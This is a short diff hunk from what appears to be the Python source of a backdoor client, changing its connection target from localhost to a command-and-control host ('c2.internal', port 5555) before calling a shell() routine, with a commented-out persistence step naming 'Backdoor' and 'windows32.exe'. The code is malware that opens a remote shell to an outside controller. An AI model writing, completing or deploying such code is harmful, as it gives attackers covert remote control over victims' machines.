@@ -294,7 +294,7 @@ def connection():
     while True:
         time.sleep(1)
         try:
-            s.connect(('127.0.0.1', 5555))
+            s.connect(('c2.internal', 5555))
             # if platform == 'win32':       #TO BE DONE
             #     persist('Backdoor', 'windows32.exe')
             shell()
